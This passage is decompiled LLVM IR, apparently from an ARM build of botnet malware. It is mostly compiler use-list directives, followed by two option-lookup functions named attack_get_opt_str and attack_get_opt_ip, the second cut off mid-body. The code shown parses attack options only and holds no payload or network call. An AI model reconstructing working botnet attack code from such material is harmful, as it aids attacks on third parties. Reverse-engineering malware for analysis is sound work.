  uselistorder i32 %v0_94f8, { 1, 0 }
  uselistorder i32 %v1_94d0, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_949c, { 1, 0 }
  uselistorder i1 %v7_9464, { 0, 2, 1 }
  uselistorder i32 %v1_9488, { 1, 0 }
  uselistorder i32 %v3_9480, { 0, 1, 3, 2, 4, 5, 6 }
  uselistorder i32 %v0_9474, { 1, 0 }
  uselistorder i1 %v7_93e8, { 1, 0 }
  uselistorder i32 %v5_93e4, { 1, 5, 3, 4, 2, 0, 6, 7 }
  uselistorder i32 %v2_93cc, { 1, 0, 2 }
  uselistorder i32 %v2_93c8, { 1, 0, 2 }
  uselistorder i32 %v1_93b4, { 0, 2, 1 }
  uselistorder i32 %v4_93ac, { 1, 2, 0, 3 }
  uselistorder i1 %v7_937c, { 1, 0 }
  uselistorder i1 %v7_9314, { 1, 0 }
  uselistorder i32 %v5_9310, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_92f8.v4_92e0, { 1, 0, 2 }
  uselistorder i1 %v7_92b0, { 1, 0 }
  uselistorder i1 %v7_923c, { 1, 0 }
  uselistorder i32 %v5_9238, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_9220.v4_9208, { 1, 0, 2 }
  uselistorder i1 %v7_91e4, { 1, 0 }
  uselistorder i1 %v7_9164, { 1, 0 }
  uselistorder i32 %v5_9160, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_9148.v4_9130, { 1, 0, 2 }
  uselistorder i1 %v7_9110, { 1, 0 }
  uselistorder i1 %v7_90e4, { 1, 0 }
  uselistorder i1 %v7_90bc, { 1, 0 }
  uselistorder i32 %v0_9078, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_9048, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v2_8fe0, { 1, 0 }
  uselistorder i32 %v2_8fd4, { 1, 0 }
  uselistorder i32 %v1_8fd4, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8fc8, { 1, 0 }
  uselistorder i32 %v3_8fac, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i32 %v2_8f8c, { 1, 0 }
  uselistorder i32 %v2_8f80, { 1, 0 }
  uselistorder i32 %v1_8f80, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8f74, { 1, 0 }
  uselistorder i32 %v3_8f58, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i1 %v7_8f14, { 1, 0 }
  uselistorder i32 %v5_8ef0, { 1, 2, 3, 0 }
  uselistorder i1 %v7_8ed8, { 1, 0 }
  uselistorder i32 %v3_8ebc, { 1, 0 }
  uselistorder i32 %v0_8e78, { 1, 0 }
  uselistorder i32 %v3_8e44, { 4, 5, 6, 3, 1, 2, 0 }
  uselistorder i32* %v2_8e44, { 1, 0 }
  uselistorder i32 %v0_8e44, { 1, 0 }
  uselistorder i32 %v3_8e2c, { 1, 0, 2 }
  uselistorder i32 %v0_8e20, { 1, 2, 0 }
  uselistorder i32 %storemerge49, { 1, 0 }
  uselistorder i1 %v7_8d9c, { 1, 0 }
  uselistorder i32 %v4_8d90, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8d60, { 1, 0 }
  uselistorder i32 %v2_8d50, { 1, 0 }
  uselistorder i32 %v2_8d44, { 1, 0 }
  uselistorder i32 %v1_8d44, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8d38, { 1, 0 }
  uselistorder i32 %v3_8d1c, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i32 %v3_8d00, { 0, 2, 1 }
  uselistorder i32 %v2_8cd8, { 1, 0 }
  uselistorder i32 %v1_8cd8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8cd8, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v1_8cc4, { 1, 0 }
  uselistorder i32 %v3_8ca4, { 1, 0, 2 }
  uselistorder i32 %v1_8c08, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8aac, { 1, 0 }
  uselistorder i32 %v3_888c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_8838, { 2, 1, 0, 3 }
  uselistorder i32 %v3_8834, { 1, 0 }
  uselistorder i32 %v3_8828, { 2, 0, 1 }
  uselistorder i1 %v7_8814, { 1, 0 }
  uselistorder i32 %v3_880c, { 3, 2, 1, 0, 4, 5 }
  uselistorder i1 %v7_87e4, { 1, 0 }
  uselistorder i1 %v7_87dc, { 1, 0 }
  uselistorder i32 %v3_87c0, { 1, 0 }
  uselistorder i32 %v1_87a0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_87a0, { 0, 2, 1 }
  uselistorder i32 %v2_879c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8788, { 1, 0, 2 }
  uselistorder i32 %v1_8748, { 1, 0 }
  uselistorder i32 %v2_8728, { 1, 0 }
  uselistorder i32 %v1_8728, { 2, 0, 1, 3 }
  uselistorder i32 %v1_871c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v0_8728, { 4, 1, 2, 5, 3, 0 }
  uselistorder i32 %v3_870c, { 1, 0 }
  uselistorder i32 %v3_8700, { 1, 0, 2 }
  uselistorder i1 %v7_865c, { 1, 0 }
  uselistorder i32 %v3_8658, { 3, 2, 1, 0, 4, 5 }
  uselistorder i1 %v7_8634, { 1, 0 }
  uselistorder i32 %v4_860c, { 2, 1, 0 }
  uselistorder i8 %v3_860c, { 11, 12, 13, 14, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_860c, { 2, 0, 3, 1 }
  uselistorder i32 %v3_88b0, { 4, 2, 3, 1, 0, 5 }
  uselistorder i1 %v7_85d4, { 1, 0 }
  uselistorder i32 %v1_85d4, { 1, 0 }
  uselistorder i1 %v7_85cc, { 1, 0 }
  uselistorder i1 %v7_85c4, { 1, 0 }
  uselistorder i1 %v7_85bc, { 1, 0 }
  uselistorder i32 %v1_85bc, { 1, 0 }
  uselistorder i1 %v7_85b4, { 1, 0 }
  uselistorder i1 %v7_85ac, { 1, 0 }
  uselistorder i32 %v1_8590, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v2_8530, { 3, 2, 0, 4, 1, 5, 6 }
  uselistorder i8* %v1_88f0, { 11, 10, 12, 8, 6, 7, 9, 0, 1, 2, 3, 4, 5, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %v2_8710, { 0, 15, 1, 2, 3, 16, 4, 17, 5, 18, 6, 19, 7, 20, 8, 21, 22, 9, 23, 10, 13, 11, 14, 12, 24 }
  uselistorder i32 %v1_9e84, { 1, 0, 2 }
  uselistorder i32 %stack_var_-20860.0.ph, { 58, 59, 57, 0, 61, 60, 1, 56, 55, 2, 64, 63, 3, 68, 67, 4, 66, 65, 5, 62, 6, 79, 78, 7, 77, 76, 8, 75, 74, 9, 73, 72, 10, 71, 11, 70, 69, 12, 54, 53, 13, 52, 51, 14, 50, 49, 15, 48, 47, 16, 46, 45, 17, 44, 43, 18, 42, 19, 41, 40, 20, 39, 38, 21, 37, 36, 22, 35, 34, 23, 33, 24, 32, 31, 25, 30, 29, 26, 27, 28 }
  uselistorder i32 %stack_var_-20864.0.ph, { 1, 0 }
  uselistorder i32 %v3_850c, { 1, 0 }
  uselistorder i32 %v0_850c, { 1, 0, 2 }
  uselistorder i32 %v2_84d8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_84cc, { 1, 0, 2 }
  uselistorder i32 %v0_84c0, { 1, 0 }
  uselistorder i32 %v5_84b8, { 1, 0 }
  uselistorder i32 %v0_8484, { 1, 2, 0, 3 }
  uselistorder i32 %v0_840c, { 5, 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_83e0, { 1, 0 }
  uselistorder i32 %v2_83b0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_839c, { 4, 5, 19, 15, 16, 17, 2, 3, 18, 0, 1, 14, 10, 11, 12, 13, 20, 8, 9, 7, 6 }
  uselistorder i32 %v0_8390, { 0, 1, 3, 2 }
  uselistorder i1 %v2_8320, { 1, 0, 2 }
  uselistorder i32* %v11_82f4, { 2, 0, 1, 3 }
  uselistorder i32 %v10_82f0, { 22, 21, 20, 12, 11, 18, 17, 16, 19, 15, 14, 33, 32, 31, 29, 28, 30, 27, 26, 13, 24, 23, 10, 9, 8, 25, 7, 39, 38, 37, 35, 36, 34, 44, 43, 42, 41, 40, 6, 5, 4, 3, 2, 1, 0, 45, 46 }
  uselistorder i32 %v2_82e8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_82d8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_82c8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_82a0, { 1, 0, 2 }
  uselistorder i8* %tmp168, { 5, 6, 4, 7, 3, 8, 2, 9, 1, 10, 11, 12, 0 }
  uselistorder i32 %v2_827c, { 0, 29, 35, 36, 37, 38, 1, 32, 2, 3, 33, 34, 39, 17, 18, 4, 28, 5, 6, 30, 31, 40, 7, 26, 8, 27, 9, 41, 10, 11, 24, 25, 42, 12, 21, 13, 22, 23, 43, 14, 15, 19, 20, 44, 45, 46, 16, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder i32 %v5_8274, { 1, 0 }
  uselistorder i32 %v6_81fc, { 3, 2, 4, 0, 8, 7, 6, 1, 5, 9 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 0, 35, 36, 37, 38, 39, 42, 40, 41 }
  uselistorder i32* %sb.global-to-local, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 11, 28, 29, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 30, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 11, 0 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 2, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 93, 39, 40, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 41, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 148, 149, 150, 151, 155, 156, 152, 153, 154, 157, 158, 159, 117, 118, 119, 120, 121, 122, 123, 125, 124, 1, 127, 128, 126, 3, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 117, 118, 120, 121, 119, 122, 123, 125, 124, 93, 94, 95, 96, 97, 98, 1, 99, 100, 2, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 39, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 59, 57, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 74, 72, 73, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 159, 135, 160, 161, 162, 163, 164, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 1, 148, 149, 150, 151, 152, 153, 154, 155, 156, 158, 157, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 18, 16, 15, 17, 207, 19, 138, 227, 58, 29, 20, 22, 21, 23, 25, 24, 27, 26, 30, 28, 31, 33, 32, 34, 36, 35, 38, 37, 42, 39, 40, 41, 43, 44, 46, 45, 48, 47, 49, 50, 51, 53, 52, 54, 55, 56, 59, 57, 61, 60, 62, 64, 63, 65, 68, 66, 67, 70, 69, 74, 71, 72, 73, 75, 77, 76, 79, 78, 80, 82, 81, 84, 83, 85, 86, 88, 87, 89, 90, 92, 91, 94, 93, 96, 95, 97, 99, 98, 100, 101, 102, 104, 103, 106, 105, 107, 109, 108, 110, 112, 111, 114, 113, 115, 117, 116, 118, 121, 119, 120, 123, 122, 125, 124, 126, 128, 127, 129, 131, 130, 133, 132, 134, 136, 135, 139, 137, 141, 140, 143, 142, 145, 144, 148, 146, 147, 150, 149, 151, 153, 152, 154, 157, 155, 156, 159, 158, 161, 160, 162, 164, 163, 165, 167, 166, 168, 169, 170, 172, 171, 174, 173, 175, 177, 176, 178, 180, 179, 181, 182, 183, 185, 184, 187, 186, 188, 190, 189, 191, 193, 192, 194, 196, 195, 197, 198, 200, 199, 202, 201, 205, 203, 204, 209, 206, 208, 212, 210, 211, 213, 215, 214, 216, 218, 217, 220, 219, 221, 222, 223, 225, 224, 229, 226, 228, 231, 230, 232, 234, 233, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 338, 339, 341, 340, 342, 343, 344, 287, 289, 288, 291, 290, 294, 293, 292, 298, 295, 296, 297, 4, 301, 299, 300, 302, 303, 304, 305, 306, 307, 1, 309, 308, 310, 311, 313, 312, 314, 315, 316, 318, 317, 319, 320, 321, 323, 322, 325, 324, 327, 326, 329, 328, 331, 330, 332, 333, 334, 335, 336, 337, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 50, 51, 52, 53, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32* %fp.global-to-local, { 0, 34, 1, 3, 2, 4, 5, 6, 7, 28, 27, 31, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 30, 32, 33, 35, 36 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 101, 94, 95, 96, 97, 98, 99, 100, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 140, 139, 141, 142, 147, 149, 148, 143, 144, 145, 146, 150, 151, 152, 153, 114, 115, 123, 124, 116, 117, 118, 119, 120, 121, 122, 125, 0, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 63, 61, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 106, 100, 101, 102, 103, 104, 105, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 152, 153, 158, 160, 159, 154, 155, 156, 157, 161, 162, 163, 164, 165, 121, 122, 123, 131, 132, 124, 125, 126, 127, 128, 129, 130, 133, 0, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151 }
  uselistorder i32 ptrtoint (i32* @global_var_1a7c4.59 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1a7b4.55 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1a7ac.53 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1a7a0.51 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 -20773, { 1, 0, 2, 4, 3, 8, 5, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_1a7a8.49 to i32), { 2, 4, 3, 5, 1, 6, 0, 7 }
  uselistorder i32 2116, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1a780.37 to i32), { 0, 2, 1, 3 }
  uselistorder i32 -1452, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24 }
  uselistorder i32 1452, { 1, 0 }
  uselistorder i32 789, { 2, 0, 1, 3 }
  uselistorder i32 1431, { 1, 2, 0, 3 }
  uselistorder i32 533, { 1, 0, 3, 2, 4 }
  uselistorder i32 3140, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 51, { 1, 3, 0, 4, 2, 5 }
  uselistorder i32 50, { 0, 2, 1, 3 }
  uselistorder i32 49, { 0, 2, 1, 3 }
  uselistorder i32 43, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1a788.29 to i32), { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg4, { 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9e44, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_9d08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9ce8, { 2, 0, 1 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %dec_label_pc_9ab4, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %dec_label_pc_9a88, { 2, 0, 1 }
  uselistorder label %.thread41, { 1, 0 }
  uselistorder label %dec_label_pc_99ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9918, { 5, 0, 1, 6, 2, 3, 4 }
  uselistorder label %dec_label_pc_98cc, { 1, 0 }
  uselistorder label %dec_label_pc_98a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9898, { 1, 0 }
  uselistorder label %.thread37, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %dec_label_pc_9654, { 6, 1, 2, 7, 3, 4, 0, 5 }
  uselistorder label %bb201, { 1, 0 }
  uselistorder label %dec_label_pc_9550, { 0, 2, 1 }
  uselistorder label %dec_label_pc_94a4, { 1, 0 }
  uselistorder label %dec_label_pc_949c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9474, { 1, 0 }
  uselistorder label %dec_label_pc_9438, { 1, 0 }
  uselistorder label %bb197, { 1, 0 }
  uselistorder label %bb195, { 1, 0 }
  uselistorder label %bb193, { 1, 0 }
  uselistorder label %dec_label_pc_934c, { 2, 1, 0 }
  uselistorder label %bb191, { 1, 0 }
  uselistorder label %.thread26, { 3, 0, 1, 2 }
  uselistorder label %bb188, { 1, 0 }
  uselistorder label %.thread25, { 3, 0, 1, 2 }
  uselistorder label %bb185, { 1, 0 }
  uselistorder label %.thread24, { 1, 0 }
  uselistorder label %.thread23, { 1, 0 }
  uselistorder label %dec_label_pc_9080, { 1, 0 }
  uselistorder label %dec_label_pc_8f38, { 1, 0 }
  uselistorder label %dec_label_pc_8e08, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8de0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d74, { 1, 2, 0 }
  uselistorder label %bb180, { 1, 0 }
  uselistorder label %dec_label_pc_8c84, { 1, 0 }
  uselistorder label %dec_label_pc_8c6c, { 1, 0 }
  uselistorder label %dec_label_pc_8c30, { 1, 0 }
  uselistorder label %dec_label_pc_8bbc, { 1, 0 }
  uselistorder label %dec_label_pc_8b84, { 1, 0 }
  uselistorder label %dec_label_pc_88bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_87ec, { 7, 8, 9, 10, 11, 1, 12, 13, 2, 14, 15, 3, 16, 0, 6, 4, 5 }
  uselistorder label %dec_label_pc_87b4, { 1, 0 }
  uselistorder label %dec_label_pc_85f4, { 5, 0, 1, 2, 6, 4, 3, 7 }
  uselistorder label %dec_label_pc_8570.dec_label_pc_8570_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8548.dec_label_pc_8548_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_852c, { 3, 0, 2, 1, 4 }
  uselistorder label %dec_label_pc_852c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_84c0, { 1, 0 }
  uselistorder label %dec_label_pc_8444, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb174, { 1, 0 }
  uselistorder label %bb172, { 1, 0 }
  uselistorder label %dec_label_pc_82fc, { 1, 0 }
  uselistorder label %dec_label_pc_82b4, { 1, 3, 4, 0, 2 }
}

define i32 @attack_get_opt_str(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_9f60 = icmp eq i32 %arg1, 0
  br i1 %v2_9f60, label %dec_label_pc_9fa8, label %dec_label_pc_9f70

dec_label_pc_9f70:                                ; preds = %entry
  %v0_9f70 = load i32, i32* %r1.global-to-local, align 4
  %v1_9f70 = add i32 %v0_9f70, 4
  %v2_9f70 = inttoptr i32 %v1_9f70 to i8*
  %v3_9f70 = load i8, i8* %v2_9f70, align 1
  %v4_9f70 = zext i8 %v3_9f70 to i32
  %v9_9f74 = icmp eq i32 %v4_9f70, %arg3
  br i1 %v9_9f74, label %dec_label_pc_9fb4, label %dec_label_pc_9f98.preheader

dec_label_pc_9f98.preheader:                      ; preds = %dec_label_pc_9f70
  br label %dec_label_pc_9f98

dec_label_pc_9f88:                                ; preds = %dec_label_pc_9f98
  %v1_9f88 = add i32 %v0_9f90.in, 12
  %v2_9f88 = inttoptr i32 %v1_9f88 to i8*
  %v3_9f88 = load i8, i8* %v2_9f88, align 1
  %v4_9f88 = zext i8 %v3_9f88 to i32
  %v9_9f8c = icmp eq i32 %v4_9f88, %arg3
  br i1 %v9_9f8c, label %dec_label_pc_9fb4, label %dec_label_pc_9f98

dec_label_pc_9f98:                                ; preds = %dec_label_pc_9f98.preheader, %dec_label_pc_9f88
  %v0_9f90.in = phi i32 [ %v0_9f70, %dec_label_pc_9f98.preheader ], [ %v0_9f90, %dec_label_pc_9f88 ]
  %v0_9f98 = phi i32 [ 0, %dec_label_pc_9f98.preheader ], [ %v1_9f98, %dec_label_pc_9f88 ]
  %v0_9f90 = add i32 %v0_9f90.in, 8
  %v1_9f98 = add i32 %v0_9f98, 1
  %v9_9f9c = icmp eq i32 %v1_9f98, %arg1
  store i32 %v0_9f90, i32* %r1.global-to-local, align 4
  br i1 %v9_9f9c, label %dec_label_pc_9fa8, label %dec_label_pc_9f88

dec_label_pc_9fa8:                                ; preds = %dec_label_pc_9f98, %entry, %dec_label_pc_9fb4
  %v0_9fa8 = phi i32 [ %arg4, %entry ], [ %v2_9fb4, %dec_label_pc_9fb4 ], [ %arg4, %dec_label_pc_9f98 ]
  ret i32 %v0_9fa8

dec_label_pc_9fb4:                                ; preds = %dec_label_pc_9f88, %dec_label_pc_9f70
  %v0_9fb4 = phi i32 [ %v0_9f70, %dec_label_pc_9f70 ], [ %v0_9f90, %dec_label_pc_9f88 ]
  %v1_9fb4 = inttoptr i32 %v0_9fb4 to i32*
  %v2_9fb4 = load i32, i32* %v1_9fb4, align 4
  br label %dec_label_pc_9fa8

; uselistorder directives
  uselistorder i32 %v1_9f98, { 1, 0 }
  uselistorder i32 %v0_9f90, { 1, 0, 2 }
  uselistorder i32 %v0_9f90.in, { 1, 0 }
  uselistorder i32 %v0_9f70, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9fa8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9f98, { 1, 0 }
}

define i32 @attack_get_opt_ip(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_9fbc = icmp eq i32 %arg1, 0
  %v3_9fc0 = load i32, i32* @r4, align 4
  store i32 %v3_9fc0, i32* %stack_var_-8, align 4
  %v6_9fc0 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_9fbc, label %dec_label_pc_a004, label %dec_label_pc_9fcc

dec_label_pc_9fcc:                                ; preds = %entry
  %v0_9fcc = load i32, i32* %r1.global-to-local, align 4
  %v1_9fcc = add i32 %v0_9fcc, 4
  %v2_9fcc = inttoptr i32 %v1_9fcc to i8*
  %v3_9fcc = load i8, i8* %v2_9fcc, align 1
  %v4_9fcc = zext i8 %v3_9fcc to i32
  %v9_9fd0 = icmp eq i32 %v4_9fcc, %arg3
  br i1 %v9_9fd0, label %dec_label_pc_a010, label %dec_label_pc_9ff4.preheader

dec_label_pc_9ff4.preheader:                      ; preds = %dec_label_pc_9fcc
  br label %dec_label_pc_9ff4

dec_label_pc_9fe4:                                ; preds = %dec_label_pc_9ff4
  %v1_9fe4 = add i32 %v0_9fec.in, 12
  %v2_9fe4 = inttoptr i32 %v1_9fe4 to i8*
  %v3_9fe4 = load i8, i8* %v2_9fe4, align 1
  %v4_9fe4 = zext i8 %v3_9fe4 to i32
  %v9_9fe8 = icmp eq i32 %v4_9fe4, %arg3
  br i1 %v9_9fe8, label %dec_label_pc_a010, label %dec_label_pc_9ff4

dec_label_pc_9ff4:                                ; preds = %dec_label_pc_9ff4.preheader, %dec_label_pc_9fe4
  %v0_9fec.in = phi i32 [ %v0_9fcc, %dec_label_pc_9ff4.preheader ], [ %v0_9fec, %dec_label_pc_9fe4 ]
  %v0_9ff4 = phi i32 [ 0, %dec_label_pc_9ff4.preheader ], [ %v1_9ff4, %dec_label_pc_9fe4 ]
  %v0_9fec = add i32 %v0_9fec.in, 8
  %v1_9ff4 = add i32 %v0_9ff4, 1
  %v9_9ff8 = icmp eq i32 %v1_9ff4, %arg1
  store i32 %v0_9fec, i32* %r1.global-to-local, align 4
  br i1 %v9_9ff8, label %dec_label_pc_a004, label %dec_label_pc_9fe4

dec_label_pc_a004:                                ; preds = %dec_label_pc_9ff4, %dec_label_pc_a010, %entry, %dec_label_pc_a01c
  %v2_a008 = phi i32 [ %v3_9fc0, %dec_label_pc_a010 ], [ %v3_9fc0, %entry ], [ %v2_a008.pre, %dec_label_pc_a01c ], [ %v3_9fc0, %dec_label_pc_9ff4 ]
  %v0_a004 = phi i32 [ %arg4, %dec_label_pc_a010 ], [ %arg4, %entry ], [ %v1_a01c, %dec_label_pc_a01c ], [ %arg4, %dec_label_pc_9ff4 ]
  store i32 %v2_a008, i32* @r4, align 4
  store i32 %v6_9fc0, i32* @lr, align 4
  ret i32 %v0_a004

dec_label_pc_a010:                                ; preds = %dec_label_pc_9fe4, %dec_label_pc_9fcc
  %v0_a010 = phi i32 [ %v0_9fcc, %dec_label_pc_9fcc ], [ %v0_9fec, %dec_label_pc_9fe4 ]
  %v1_a010 = inttoptr i32 %v0_a010 to i32*
  %v2_a010 = load i32, i32* %v1_a010, align 4
  store i32 %v2_a010, i32* @r0, align 4
  %v2_a014 = icmp eq i32 %v2_a010, 0
  br i1 %v2_a014, label %dec_label_pc_a004, label %dec_label_pc_a01c

